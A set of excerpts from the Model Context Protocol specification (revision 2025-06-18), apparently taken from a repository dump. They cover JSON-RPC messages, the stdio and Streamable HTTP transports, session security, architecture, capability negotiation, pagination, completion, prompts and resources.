the following mitigations should be implemented:\n\nMCP servers that implement authorization **MUST** verify all inbound requests.\nMCP Servers **MUST NOT** use sessions for authentication.\n\nMCP servers **MUST** use secure, non-deterministic session IDs.\nGenerated session IDs (e.g., UUIDs) **SHOULD** use secure random number generators. Avoid predictable or sequential session identifiers that could be guessed by an attacker. Rotating or expiring session IDs can also reduce the risk.\n\nMCP servers **SHOULD** bind session IDs to user-specific information.\nWhen storing or transmitting session-related data (e.g., in a queue), combine the session ID with information unique to the authorized user, such as their internal user ID. Use a key format like `<user_id>:<session_id>`. This ensures that even if an attacker guesses a session ID, they cannot impersonate another user as the user ID is derived from the user token and not provided by the client.\n\nMCP servers can optionally leverage additional unique identifiers.\n"}

Other components **MAY** be implemented based on the specific needs of the\napplication.\n\nThese protocol layers establish clear separation of concerns while enabling rich\ninteractions between clients and servers. The modular design allows implementations to\nsupport exactly the features they need.\n\n## Messages\n\nAll messages between MCP clients and servers **MUST** follow the\n[JSON-RPC 2.0](https://www.jsonrpc.org/specification) specification. The protocol defines\nthese types of messages:\n\n### Requests\n\nRequests are sent from the client to the server or vice versa, to initiate an operation.\n\n```typescript\n{\n  jsonrpc: \"2.0\";\n  id: string | number;\n  method: string;\n  params?: {\n    [key: string]: unknown;\n  };\n}\n```\n\n- Requests **MUST** include a string or integer ID.\n- Unlike base JSON-RPC, the ID **MUST NOT** be `null`.\n- The request ID **MUST NOT** have been previously used by the requestor within the same\n  session.\n\n### Responses\n\nResponses are sent in reply to requests, containing the result or error of the operation.\n\n```typescript\n{\n  jsonrpc: \"2.0\";\n  id: string | number;\n  result?: {\n    [key: string]: unknown;\n  }\n  error?: {\n    code: number;\n    message: string;\n    data?: unknown;\n  }\n}\n```\n\n- Responses **MUST** include the same ID as the request they correspond to.\n- **Responses** are further sub-categorized as either **successful results** or\n  **errors**. Either a `result` or an `error` **MUST** be set. A response **MUST NOT**\n  set both.\n- Results **MAY** follow any JSON object structure, while errors **MUST** include an\n  error code and message at minimum.\n- Error codes **MUST** be integers.\n\n### Notifications\n\nNotifications are sent from the client to the server or vice versa, as a one-way message.\nThe receiver **MUST NOT** send a response.\n\n```typescript\n{\n  jsonrpc: \"2.0\";\n  method: string;\n  params?: {\n    [key: string]: unknown;\n  };\n}\n```\n\n- Notifications **MUST NOT** include an ID.\n\n## Auth\n\nMCP provides an [Authorization](/specification/2025-06-18/basic/authorization) framework for use with HTTP.\nImplementations using an HTTP-based transport **SHOULD** conform to this specification,\nwhereas implementations using STDIO transport **SHOULD NOT** follow this specification,\nand instead retrieve credentials from the environment.\n\nAdditionally, clients and servers **MAY** negotiate their own custom authentication and\nauthorization strategies.\n\nFor further discussions and contributions to the evolution of MCP’s auth mechanisms, join\nus in\n[GitHub Discussions](https://github.com/modelcontextprotocol/specification/discussions)\nto help shape the future of the protocol!\n\n## Schema\n\nThe full specification of the protocol is defined as a\n[TypeScript schema](https://github.com/modelcontextprotocol/specification/blob/main/schema/2025-06-18/schema.ts).\nThis is the source of truth for all protocol messages and structures.\n\nThere is also a\n[JSON Schema](https://github.com/modelcontextprotocol/specification/blob/main/schema/2025-06-18/schema.json),\nwhich is automatically generated from the TypeScript source of truth, for use with\nvarious automated tooling.\n\n### General fields\n\n#### `_meta`\n\nThe `_meta` property/parameter is reserved by MCP to allow clients and servers\nto attach additional metadata to their interactions.\n\nCertain key names are reserved by MCP for protocol-level metadata, as specified below;\nimplementations MUST NOT make assumptions about values at these keys.\n\nAdditionally, definitions in the [schema](https://github.com/modelcontextprotocol/specification/blob/main/schema/2025-06-18/schema.ts)\nmay reserve particular names for purpose-specific metadata, as declared in those definitions.\n\n**Key name format:** valid `_meta` key names have two segments: an optional **prefix**, and a **name**.\n\n**Prefix:**\n\n- If specified, MUST be a series of labels separated by dots (`.`), followed by a slash (`/`).\n  - Labels MUST start with a letter and end with a letter or digit; interior characters can be letters, digits, or hyphens (`-`).\n- Any prefix beginning with zero or more valid labels, followed by `modelcontextprotocol` or `mcp`, followed by any valid label,\n  is **reserved** for MCP use.\n  - For example: `modelcontextprotocol.io/`, `mcp.dev/`, `api.modelcontextprotocol.org/`, and `tools.mcp.com/` are all reserved.\n\n**Name:**\n\n- Unless empty, MUST begin and end with an alphanumeric character (`[a-z0-9A-Z]`).\n- MAY contain hyphens (`-`), underscores (`_`), dots (`.`), and alphanumerics in between.\n"}
{"source":"github","repo":"mcp-spec","path":"docs/specification/2025-06-18/basic/transports.mdx","content":"---\ntitle: Transports\n---\n\n<div id=\"enable-section-numbers\" />\n\n<Info>**Protocol Revision**: 2025-06-18</Info>\n\nMCP uses JSON-RPC to encode messages. JSON-RPC messages **MUST** be UTF-8 encoded.\n\nThe protocol currently defines two standard transport mechanisms for client-server\ncommunication:\n\n1. [stdio](#stdio), communication over standard in and standard out\n2. [Streamable HTTP](#streamable-http)\n\nClients **SHOULD** support stdio whenever possible.\n\nIt is also possible for clients and servers to implement\n[custom transports](#custom-transports) in a pluggable fashion.\n\n## stdio\n\nIn the **stdio** transport:\n\n- The client launches the MCP server as a subprocess.\n- The server reads JSON-RPC messages from its standard input (`stdin`) and sends messages\n  to its standard output (`stdout`).\n- Messages are individual JSON-RPC requests, notifications, or responses.\n- Messages are delimited by newlines, and **MUST NOT** contain embedded newlines.\n- The server **MAY** write UTF-8 strings to its standard error (`stderr`) for logging\n  purposes. Clients **MAY** capture, forward, or ignore this logging.\n- The server **MUST NOT** write anything to its `stdout` that is not a valid MCP message.\n- The client **MUST NOT** write anything to the server's `stdin` that is not a valid MCP\n  message.\n\n```mermaid\nsequenceDiagram\n    participant Client\n    participant Server Process\n\n    Client->>+Server Process: Launch subprocess\n    loop Message Exchange\n        Client->>Server Process: Write to stdin\n        Server Process->>Client: Write to stdout\n        Server Process--)Client: Optional logs on stderr\n    end\n    Client->>Server Process: Close stdin, terminate subprocess\n    deactivate Server Process\n```\n\n## Streamable HTTP\n\n<Info>\n\nThis replaces the [HTTP+SSE\ntransport](/specification/2024-11-05/basic/transports#http-with-sse) from\nprotocol version 2024-11-05. See the [backwards compatibility](#backwards-compatibility)\nguide below.\n\n</Info>\n\nIn the **Streamable HTTP** transport, the server operates as an independent process that\ncan handle multiple client connections. This transport uses HTTP POST and GET requests.\nServer can optionally make use of\n[Server-Sent Events](https://en.wikipedia.org/wiki/Server-sent_events) (SSE) to stream\nmultiple server messages. This permits basic MCP servers, as well as more feature-rich\nservers supporting streaming and server-to-client notifications and requests.\n\nThe server **MUST** provide a single HTTP endpoint path (hereafter referred to as the\n**MCP endpoint**) that supports both POST and GET methods. For example, this could be a\nURL like `https://example.com/mcp`.\n\n#### Security Warning\n\nWhen implementing Streamable HTTP transport:\n\n1. Servers **MUST** validate the `Origin` header on all incoming connections to prevent DNS rebinding attacks\n2. When running locally, servers **SHOULD** bind only to localhost (127.0.0.1) rather than all network interfaces (0.0.0.0)\n3. Servers **SHOULD** implement proper authentication for all connections\n\nWithout these protections, attackers could use DNS rebinding to interact with local MCP servers from remote websites.\n\n### Sending Messages to the Server\n\nEvery JSON-RPC message sent from the client **MUST** be a new HTTP POST request to the\nMCP endpoint.\n\n1. The client **MUST** use HTTP POST to send JSON-RPC messages to the MCP endpoint.\n2. The client **MUST** include an `Accept` header, listing both `application/json` and\n   `text/event-stream` as supported content types.\n3. The body of the POST request **MUST** be a single JSON-RPC _request_, _notification_, or _response_.\n4. If the input is a JSON-RPC _response_ or _notification_:\n   - If the server accepts the input, the server **MUST** return HTTP status code 202\n     Accepted with no body.\n   - If the server cannot accept the input, it **MUST** return an HTTP error status code\n     (e.g., 400 Bad Request). The HTTP response body **MAY** comprise a JSON-RPC _error\n     response_ that has no `id`.\n5. If the input is a JSON-RPC _request_, the server **MUST** either\n   return `Content-Type: text/event-stream`, to initiate an SSE stream, or\n   `Content-Type: application/json`, to return one JSON object. The client **MUST**\n   support both these cases.\n6. If the server initiates an SSE stream:\n   - The SSE stream **SHOULD** eventually include JSON-RPC _response_ for the\n     JSON-RPC _request_ sent in the POST body.\n   - The server **MAY** send JSON-RPC _requests_ and _notifications_ before sending the\n     JSON-RPC _response_. These messages **SHOULD** relate to the originating client\n     _request_.\n   - The server **SHOULD NOT** close the SSE stream before sending the JSON-RPC _response_\n     for the received JSON-RPC _request_, unless the [session](#session-management)\n     expires.\n   - After the JSON-RPC _response_ has been sent, the server **SHOULD** close the SSE\n     stream.\n   - Disconnection **MAY** occur at any time (e.g., due to network conditions).\n     Therefore:\n     - Disconnection **SHOULD NOT** be interpreted as the client cancelling its request.\n     - To cancel, the client **SHOULD** explicitly send an MCP `CancelledNotification`.\n     - To avoid message loss due to disconnection, the server **MAY** make the stream\n       [resumable](#resumability-and-redelivery).\n\n### Listening for Messages from the Server\n\n1. The client **MAY** issue an HTTP GET to the MCP endpoint. This can be used to open an\n   SSE stream, allowing the server to communicate to the client, without the client first\n   sending data via HTTP POST.\n2. The client **MUST** include an `Accept` header, listing `text/event-stream` as a\n   supported content type.\n3. The server **MUST** either return `Content-Type: text/event-stream` in response to\n   this HTTP GET, or else return HTTP 405 Method Not Allowed, indicating that the server\n   does not offer an SSE stream at this endpoint.\n4. If the server initiates an SSE stream:\n   - The server **MAY** send JSON-RPC _requests_ and _notifications_ on the stream.\n   - These messages **SHOULD** be unrelated to any concurrently-running JSON-RPC\n     _request_ from the client.\n   - The server **MUST NOT** send a JSON-RPC _response_ on the stream **unless**\n     [resuming](#resumability-and-redelivery) a stream associated with a previous client\n     request.\n   - The server **MAY** close the SSE stream at any time.\n   - The client **MAY** close the SSE stream at any time.\n\n### Multiple Connections\n\n1. The client **MAY** remain connected to multiple SSE streams simultaneously.\n2. The server **MUST** send each of its JSON-RPC messages on only one of the connected\n   streams; that is, it **MUST NOT** broadcast the same message across multiple streams.\n   - The risk of message loss **MAY** be mitigated by making the stream\n     [resumable](#resumability-and-redelivery).\n\n### Resumability and Redelivery\n\nTo support resuming broken connections, and redelivering messages that might otherwise be\nlost:\n\n1. Servers **MAY** attach an `id` field to their SSE events, as described in the\n   [SSE standard](https://html.spec.whatwg.org/multipage/server-sent-events.html#event-stream-interpretation).\n   - If present, the ID **MUST** be globally unique across all streams within that\n     [session](#session-management)—or all streams with that specific client, if session\n     management is not in use.\n2. If the client wishes to resume after a broken connection, it **SHOULD** issue an HTTP\n   GET to the MCP endpoint, and include the\n   [`Last-Event-ID`](https://html.spec.whatwg.org/multipage/server-sent-events.html#the-last-event-id-header)\n   header to indicate the last event ID it received.\n   - The server **MAY** use this header to replay messages that would have been sent\n     after the last event ID, _on the stream that was disconnected_, and to resume the\n     stream from that point.\n   - The server **MUST NOT** replay messages that would have been delivered on a\n     different stream.\n\nIn other words, these event IDs should be assigned by servers on a _per-stream_ basis, to\nact as a cursor within that particular stream.\n\n### Session Management\n\nAn MCP \"session\" consists of logically related interactions between a client and a\nserver, beginning with the [initialization phase](/specification/2025-06-18/basic/lifecycle). To support\nservers which want to establish stateful sessions:\n\n1. A server using the Streamable HTTP transport **MAY** assign a session ID at\n   initialization time, by including it in an `Mcp-Session-Id` header on the HTTP\n   response containing the `InitializeResult`.\n   - The session ID **SHOULD** be globally unique and cryptographically secure (e.g., a\n     securely generated UUID, a JWT, or a cryptographic hash).\n   - The session ID **MUST** only contain visible ASCII characters (ranging from 0x21 to\n     0x7E).\n2. If an `Mcp-Session-Id` is returned by the server during initialization, clients using\n   the Streamable HTTP transport **MUST** include it in the `Mcp-Session-Id` header on\n   all of their subsequent HTTP requests.\n   - Servers that require a session ID **SHOULD** respond to requests without an\n     `Mcp-Session-Id` header (other than initialization) with HTTP 400 Bad Request.\n3. The server **MAY** terminate the session at any time, after which it **MUST** respond\n   to requests containing that session ID with HTTP 404 Not Found.\n4. When a client receives HTTP 404 in response to a request containing an\n   `Mcp-Session-Id`, it **MUST** start a new session by sending a new `InitializeRequest`\n   without a session ID attached.\n5. Clients that no longer need a particular session (e.g., because the user is leaving\n   the client application) **SHOULD** send an HTTP DELETE to the MCP endpoint with the\n   `Mcp-Session-Id` header, to explicitly terminate the session.\n   - The server **MAY** respond to this request with HTTP 405 Method Not Allowed,\n     indicating that the server does not allow clients to terminate sessions.\n\n### Sequence Diagram\n\n```mermaid\nsequenceDiagram\n    participant Client\n    participant Server\n\n    note over Client, Server: initialization\n\n    Client->>+Server: POST InitializeRequest\n    Server->>-Client: InitializeResponse<br>Mcp-Session-Id: 1868a90c...\n\n    Client->>+Server: POST InitializedNotification<br>Mcp-Session-Id: 1868a90c...\n    Server->>-Client: 202 Accepted\n\n    note over Client, Server: client requests\n    Client->>+Server: POST ... request ...<br>Mcp-Session-Id: 1868a90c...\n\n    alt single HTTP response\n      Server->>Client: ... response ...\n    else server opens SSE stream\n      loop while connection remains open\n          Server-)Client: ...

SSE messages from server ...\n    end\n    deactivate Server\n\n```\n\n### Protocol Version Header\n\nIf using HTTP, the client **MUST** include the `MCP-Protocol-Version:\n<protocol-version>` HTTP header on all subsequent requests to the MCP\nserver, allowing the MCP server to respond based on the MCP protocol version.\n\nFor example: `MCP-Protocol-Version: 2025-06-18`\n\nThe protocol version sent by the client **SHOULD** be the one [negotiated during\ninitialization](/specification/2025-06-18/basic/lifecycle#version-negotiation).\n\nFor backwards compatibility, if the server does _not_ receive an `MCP-Protocol-Version`\nheader, and has no other way to identify the version - for example, by relying on the\nprotocol version negotiated during initialization - the server **SHOULD** assume protocol\nversion `2025-03-26`.\n\nIf the server receives a request with an invalid or unsupported\n`MCP-Protocol-Version`, it **MUST** respond with `400 Bad Request`.\n\n### Backwards Compatibility\n\nClients and servers can maintain backwards compatibility with the deprecated [HTTP+SSE\ntransport](/specification/2024-11-05/basic/transports#http-with-sse) (from\nprotocol version 2024-11-05) as follows:\n\n**Servers** wanting to support older clients should:\n\n- Continue to host both the SSE and POST endpoints of the old transport, alongside the\n  new \"MCP endpoint\" defined for the Streamable HTTP transport.\n  - It is also possible to combine the old POST endpoint and the new MCP endpoint, but\n    this may introduce unneeded complexity.\n\n**Clients** wanting to support older servers should:\n\n1. Accept an MCP server URL from the user, which may point to either a server using the\n   old transport or the new transport.\n2. Attempt to POST an `InitializeRequest` to the server URL, with an `Accept` header as\n   defined above:\n   - If it succeeds, the client can assume this is a server supporting the new Streamable\n     HTTP transport.\n   - If it fails with an HTTP 4xx status code (e.g., 405 Method Not Allowed or 404 Not\n     Found):\n     - Issue a GET request to the server URL, expecting that this will open an SSE stream\n       and return an `endpoint` event as the first event.\n     - When the `endpoint` event arrives, the client can assume this is a server running\n       the old HTTP+SSE transport, and should use that transport for all subsequent\n       communication.\n\n## Custom Transports\n\nClients and servers **MAY** implement additional custom transport mechanisms to suit\ntheir specific needs. The protocol is transport-agnostic and can be implemented over any\ncommunication channel that supports bidirectional message exchange.\n\nImplementers who choose to support custom transports **MUST** ensure they preserve the\nJSON-RPC message format and lifecycle requirements defined by MCP. Custom transports\n**SHOULD** document their specific connection establishment and message exchange patterns\nto aid interoperability.\n"}

This architecture enables users to integrate AI\ncapabilities across applications while maintaining clear security boundaries and\nisolating concerns. Built on JSON-RPC, MCP provides a stateful session protocol focused\non context exchange and sampling coordination between clients and servers.\n\n## Core Components\n\n```mermaid\ngraph LR\n    subgraph \"Application Host Process\"\n        H[Host]\n        C1[Client 1]\n        C2[Client 2]\n        C3[Client 3]\n        H --> C1\n        H --> C2\n        H --> C3\n    end\n\n    subgraph \"Local machine\"\n        S1[Server 1<br>Files & Git]\n        S2[Server 2<br>Database]\n        R1[(\"Local<br>Resource A\")]\n        R2[(\"Local<br>Resource B\")]\n\n        C1 --> S1\n        C2 --> S2\n        S1 <--> R1\n        S2 <--> R2\n    end\n\n    subgraph \"Internet\"\n        S3[Server 3<br>External APIs]\n        R3[(\"Remote<br>Resource C\")]\n\n        C3 --> S3\n        S3 <--> R3\n    end\n```\n\n### Host\n\nThe host process acts as the container and coordinator:\n\n- Creates and manages multiple client instances\n- Controls client connection permissions and lifecycle\n- Enforces security policies and consent requirements\n- Handles user authorization decisions\n- Coordinates AI/LLM integration and sampling\n- Manages context aggregation across clients\n\n### Clients\n\nEach client is created by the host and maintains an isolated server connection:\n\n- Establishes one stateful session per server\n- Handles protocol negotiation and capability exchange\n- Routes protocol messages bidirectionally\n- Manages subscriptions and notifications\n- Maintains security boundaries between servers\n\nA host application creates and manages multiple clients, with each client having a 1:1\nrelationship with a particular server.\n\n### Servers\n\nServers provide specialized context and capabilities:\n\n- Expose resources, tools and prompts via MCP primitives\n- Operate independently with focused responsibilities\n- Request sampling through client interfaces\n- Must respect security constraints\n- Can be local processes or remote services\n\n## Design Principles\n\nMCP is built on several key design principles that inform its architecture and\nimplementation:\n\n1. **Servers should be extremely easy to build**\n   - Host applications handle complex orchestration responsibilities\n   - Servers focus on specific, well-defined capabilities\n   - Simple interfaces minimize implementation overhead\n   - Clear separation enables maintainable code\n\n2. **Servers should be highly composable**\n   - Each server provides focused functionality in isolation\n   - Multiple servers can be combined seamlessly\n   - Shared protocol enables interoperability\n   - Modular design supports extensibility\n\n3. **Servers should not be able to read the whole conversation, nor \"see into\" other\n   servers**\n   - Servers receive only necessary contextual information\n   - Full conversation history stays with the host\n   - Each server connection maintains isolation\n   - Cross-server interactions are controlled by the host\n   - Host process enforces security boundaries\n\n4. **Features can be added to servers and clients progressively**\n   - Core protocol provides minimal required functionality\n   - Additional capabilities can be negotiated as needed\n   - Servers and clients evolve independently\n   - Protocol designed for future extensibility\n   - Backwards compatibility is maintained\n\n## Capability Negotiation\n\nThe Model Context Protocol uses a capability-based negotiation system where clients and\nservers explicitly declare their supported features during initialization. Capabilities\ndetermine which protocol features and primitives are available during a session.\n\n- Servers declare capabilities like resource subscriptions, tool support, and prompt\n  templates\n- Clients declare capabilities like sampling support and notification handling\n- Both parties must respect declared capabilities throughout the session\n- Additional capabilities can be negotiated through extensions to the protocol\n\n```mermaid\nsequenceDiagram\n    participant Host\n    participant Client\n    participant Server\n\n    Host->>+Client: Initialize client\n    Client->>+Server: Initialize session with capabilities\n    Server-->>Client: Respond with supported capabilities\n\n    Note over Host,Server: Active Session with Negotiated Features\n\n    loop Client Requests\n        Host->>Client: User- or model-initiated action\n        Client->>Server: Request (tools/resources)\n        Server-->>Client: Response\n        Client-->>Host: Update UI or respond to model\n    end\n\n    loop Server Requests\n        Server->>Client: Request (sampling)\n        Client->>Host: Forward to AI\n        Host-->>Client: AI response\n        Client-->>Server: Response\n    end\n\n    loop Notifications\n        Server--)Client: Resource updates\n        Client--)Server: Status changes\n    end\n\n    Host->>Client: Terminate\n    Client->>-Server: End session\n    deactivate Server\n```\n\nEach capability unlocks specific protocol features for use during the session. For\nexample:\n\n- Implemented [server features](/specification/2025-06-18/server) must be advertised in the\n  server's capabilities\n- Emitting resource subscription notifications requires the server to declare\n  subscription support\n- Tool invocation requires the server to declare tool capabilities\n- [Sampling](/specification/2025-06-18/client) requires the client to declare support in its\n  capabilities\n\nThis capability negotiation ensures clients and servers have a clear understanding of\nsupported functionality while maintaining protocol extensibility.\n"}

Pagination allows servers to yield results in smaller chunks rather\nthan all at once.\n\nPagination is especially important when connecting to external services over the\ninternet, but also useful for local integrations to avoid performance issues with large\ndata sets.\n\n## Pagination Model\n\nPagination in MCP uses an opaque cursor-based approach, instead of numbered pages.\n\n- The **cursor** is an opaque string token, representing a position in the result set\n- **Page size** is determined by the server, and clients **MUST NOT** assume a fixed page\n  size\n\n## Response Format\n\nPagination starts when the server sends a **response** that includes:\n\n- The current page of results\n- An optional `nextCursor` field if more results exist\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": \"123\",\n  \"result\": {\n    \"resources\": [...],\n    \"nextCursor\": \"eyJwYWdlIjogM30=\"\n  }\n}\n```\n\n## Request Format\n\nAfter receiving a cursor, the client can _continue_ paginating by issuing a request\nincluding that cursor:\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": \"124\",\n  \"method\": \"resources/list\",\n  \"params\": {\n    \"cursor\": \"eyJwYWdlIjogMn0=\"\n  }\n}\n```\n\n## Pagination Flow\n\n```mermaid\nsequenceDiagram\n    participant Client\n    participant Server\n\n    Client->>Server: List Request (no cursor)\n    loop Pagination Loop\n      Server-->>Client: Page of results + nextCursor\n      Client->>Server: List Request (with cursor)\n    end\n```\n\n## Operations Supporting Pagination\n\nThe following MCP operations support pagination:\n\n- `resources/list` - List available resources\n- `resources/templates/list` - List resource templates\n- `prompts/list` - List available prompts\n- `tools/list` - List available tools\n\n## Implementation Guidelines\n\n1. Servers **SHOULD**:\n   - Provide stable cursors\n   - Handle invalid cursors gracefully\n\n2. Clients **SHOULD**:\n   - Treat a missing `nextCursor` as the end of results\n   - Support both paginated and non-paginated flows\n\n3. Clients **MUST** treat cursors as opaque tokens:\n   - Don't make assumptions about cursor format\n   - Don't attempt to parse or modify cursors\n   - Don't persist cursors across sessions\n\n## Error Handling\n\nInvalid cursors **SHOULD** result in an error with code -32602 (Invalid params).\n"}

This enables rich,\nIDE-like experiences where users receive contextual suggestions while entering argument\nvalues.\n\n## User Interaction Model\n\nCompletion in MCP is designed to support interactive user experiences similar to IDE code\ncompletion.\n\nFor example, applications may show completion suggestions in a dropdown or popup menu as\nusers type, with the ability to filter and select from available options.\n\nHowever, implementations are free to expose completion through any interface pattern that\nsuits their needs&mdash;the protocol itself does not mandate any specific user\ninteraction model.\n\n## Capabilities\n\nServers that support completions **MUST** declare the `completions` capability:\n\n```json\n{\n  \"capabilities\": {\n    \"completions\": {}\n  }\n}\n```\n\n## Protocol Messages\n\n### Requesting Completions\n\nTo get completion suggestions, clients send a `completion/complete` request specifying\nwhat is being completed through a reference type:\n\n**Request:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 1,\n  \"method\": \"completion/complete\",\n  \"params\": {\n    \"ref\": {\n      \"type\": \"ref/prompt\",\n      \"name\": \"code_review\"\n    },\n    \"argument\": {\n      \"name\": \"language\",\n      \"value\": \"py\"\n    }\n  }\n}\n```\n\n**Response:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 1,\n  \"result\": {\n    \"completion\": {\n      \"values\": [\"python\", \"pytorch\", \"pyside\"],\n      \"total\": 10,\n      \"hasMore\": true\n    }\n  }\n}\n```\n\nFor prompts or URI templates with multiple arguments, clients should include previous completions in the `context.arguments` object to provide context for subsequent requests.\n\n**Request:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 1,\n  \"method\": \"completion/complete\",\n  \"params\": {\n    \"ref\": {\n      \"type\": \"ref/prompt\",\n      \"name\": \"code_review\"\n    },\n    \"argument\": {\n      \"name\": \"framework\",\n      \"value\": \"fla\"\n    },\n    \"context\": {\n      \"arguments\": {\n        \"language\": \"python\"\n      }\n    }\n  }\n}\n```\n\n**Response:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 1,\n  \"result\": {\n    \"completion\": {\n      \"values\": [\"flask\"],\n      \"total\": 1,\n      \"hasMore\": false\n    }\n  }\n}\n```\n\n### Reference Types\n\nThe protocol supports two types of completion references:\n\n| Type           | Description                 | Example                                             |\n| -------------- | --------------------------- | --------------------------------------------------- |\n| `ref/prompt`   | References a prompt by name | `{\"type\": \"ref/prompt\", \"name\": \"code_review\"}`     |\n| `ref/resource` | References a resource URI   | `{\"type\": \"ref/resource\", \"uri\": \"file:///{path}\"}` |\n\n### Completion Results\n\nServers return an array of completion values ranked by relevance, with:\n\n- Maximum 100 items per response\n- Optional total number of available matches\n- Boolean indicating if additional results exist\n\n## Message Flow\n\n```mermaid\nsequenceDiagram\n    participant Client\n    participant Server\n\n    Note over Client: User types argument\n    Client->>Server: completion/complete\n    Server-->>Client: Completion suggestions\n\n    Note over Client: User continues typing\n    Client->>Server: completion/complete\n    Server-->>Client: Refined suggestions\n```\n\n## Data Types\n\n### CompleteRequest\n\n- `ref`: A `PromptReference` or `ResourceReference`\n- `argument`: Object containing:\n  - `name`: Argument name\n  - `value`: Current value\n- `context`: Object containing:\n  - `arguments`: A mapping of already-resolved argument names to their values.\n\n### CompleteResult\n\n- `completion`: Object containing:\n  - `values`: Array of suggestions (max 100)\n  - `total`: Optional total matches\n  - `hasMore`: Additional results flag\n\n## Error Handling\n\nServers **SHOULD** return standard JSON-RPC errors for common failure cases:\n\n- Method not found: `-32601` (Capability not supported)\n- Invalid prompt name: `-32602` (Invalid params)\n- Missing required arguments: `-32602` (Invalid params)\n- Internal errors: `-32603` (Internal error)\n\n## Implementation Considerations\n\n1.

Clients can discover available\nprompts, retrieve their contents, and provide arguments to customize them.\n\n## User Interaction Model\n\nPrompts are designed to be **user-controlled**, meaning they are exposed from servers to\nclients with the intention of the user being able to explicitly select them for use.\n\nTypically, prompts would be triggered through user-initiated commands in the user\ninterface, which allows users to naturally discover and invoke available prompts.\n\nFor example, as slash commands:\n\n![Example of prompt exposed as slash command](/specification/2025-06-18/server/slash-command.png)\n\nHowever, implementors are free to expose prompts through any interface pattern that suits\ntheir needs&mdash;the protocol itself does not mandate any specific user interaction\nmodel.\n\n## Capabilities\n\nServers that support prompts **MUST** declare the `prompts` capability during\n[initialization](/specification/2025-06-18/basic/lifecycle#initialization):\n\n```json\n{\n  \"capabilities\": {\n    \"prompts\": {\n      \"listChanged\": true\n    }\n  }\n}\n```\n\n`listChanged` indicates whether the server will emit notifications when the list of\navailable prompts changes.\n\n## Protocol Messages\n\n### Listing Prompts\n\nTo retrieve available prompts, clients send a `prompts/list` request. This operation\nsupports [pagination](/specification/2025-06-18/server/utilities/pagination).\n\n**Request:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 1,\n  \"method\": \"prompts/list\",\n  \"params\": {\n    \"cursor\": \"optional-cursor-value\"\n  }\n}\n```\n\n**Response:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 1,\n  \"result\": {\n    \"prompts\": [\n      {\n        \"name\": \"code_review\",\n        \"title\": \"Request Code Review\",\n        \"description\": \"Asks the LLM to analyze code quality and suggest improvements\",\n        \"arguments\": [\n          {\n            \"name\": \"code\",\n            \"description\": \"The code to review\",\n            \"required\": true\n          }\n        ]\n      }\n    ],\n    \"nextCursor\": \"next-page-cursor\"\n  }\n}\n```\n\n### Getting a Prompt\n\nTo retrieve a specific prompt, clients send a `prompts/get` request.

This enables\nmulti-modal interactions where visual context is important.\n\n#### Audio Content\n\nAudio content allows including audio information in messages:\n\n```json\n{\n  \"type\": \"audio\",\n  \"data\": \"base64-encoded-audio-data\",\n  \"mimeType\": \"audio/wav\"\n}\n```\n\nThe audio data MUST be base64-encoded and include a valid MIME type. This enables\nmulti-modal interactions where audio context is important.\n\n#### Embedded Resources\n\nEmbedded resources allow referencing server-side resources directly in messages:\n\n```json\n{\n  \"type\": \"resource\",\n  \"resource\": {\n    \"uri\": \"resource://example\",\n    \"mimeType\": \"text/plain\",\n    \"text\": \"Resource content\"\n  }\n}\n```\n\nResources can contain either text or binary (blob) data and **MUST** include:\n\n- A valid resource URI\n- The appropriate MIME type\n- Either text content or base64-encoded blob data\n\nEmbedded resources enable prompts to seamlessly incorporate server-managed content like\ndocumentation, code samples, or other reference materials directly into the conversation\nflow.\n\n## Error Handling\n\nServers **SHOULD** return standard JSON-RPC errors for common failure cases:\n\n- Invalid prompt name: `-32602` (Invalid params)\n- Missing required arguments: `-32602` (Invalid params)\n- Internal errors: `-32603` (Internal error)\n\n## Implementation Considerations\n\n1. Servers **SHOULD** validate prompt arguments before processing\n2. Clients **SHOULD** handle pagination for large prompt lists\n3. Both parties **SHOULD** respect capability negotiation\n\n## Security\n\nImplementations **MUST** carefully validate all prompt inputs and outputs to prevent\ninjection attacks or unauthorized access to resources.\n"}

Valid values are `\"user\"` and `\"assistant\"`. For example, `[\"user\", \"assistant\"]` indicates content useful for both.\n- **`priority`**: A number from 0.0 to 1.0 indicating the importance of this resource. A value of 1 means \"most important\" (effectively required), while 0 means \"least important\" (entirely optional).\n- **`lastModified`**: An ISO 8601 formatted timestamp indicating when the resource was last modified (e.g., `\"2025-01-12T15:00:58Z\"`).\n\nExample resource with annotations:\n\n```json\n{\n  \"uri\": \"file:///project/README.md\",\n  \"name\": \"README.md\",\n  \"title\": \"Project Documentation\",\n  \"mimeType\": \"text/markdown\",\n  \"annotations\": {\n    \"audience\": [\"user\"],\n    \"priority\": 0.8,\n    \"lastModified\": \"2025-01-12T15:00:58Z\"\n  }\n}\n```\n\nClients can use these annotations to:\n\n- Filter resources based on their intended audience\n- Prioritize which resources to include in context\n- Display modification times or sort by recency\n\n## Common URI Schemes\n\nThe protocol defines several standard URI schemes. This list not\nexhaustive&mdash;implementations are always free to use additional, custom URI schemes.\n\n### https://\n\nUsed to represent a resource available on the web.\n\nServers **SHOULD** use this scheme only when the client is able to fetch and load the\nresource directly from the web on its own—that is, it doesn’t need to read the resource\nvia the MCP server.\n\nFor other use cases, servers **SHOULD** prefer to use another URI scheme, or define a\ncustom one, even if the server will itself be downloading resource contents over the\ninternet.\n\n### file://\n\nUsed to identify resources that behave like a filesystem. However, the resources do not\nneed to map to an actual physical filesystem.\n\nMCP servers **MAY** identify file:// resources with an\n[XDG MIME type](https://specifications.freedesktop.org/shared-mime-info-spec/0.14/ar01s02.html#id-1.3.14),\nlike `inode/directory`, to represent non-regular files (such as directories) that don’t\notherwise have a standard MIME type.\n\n### git://\n\nGit version control integration.\n\n### Custom URI Schemes\n\nCustom URI schemes **MUST** be in accordance with [RFC3986](https://datatracker.ietf.org/doc/html/rfc3986),\ntaking the above guidance in to account.\n\n## Error Handling\n\nServers **SHOULD** return standard JSON-RPC errors for common failure cases:\n\n- Resource not found: `-32002`\n- Internal errors: `-32603`\n\nExample error:\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  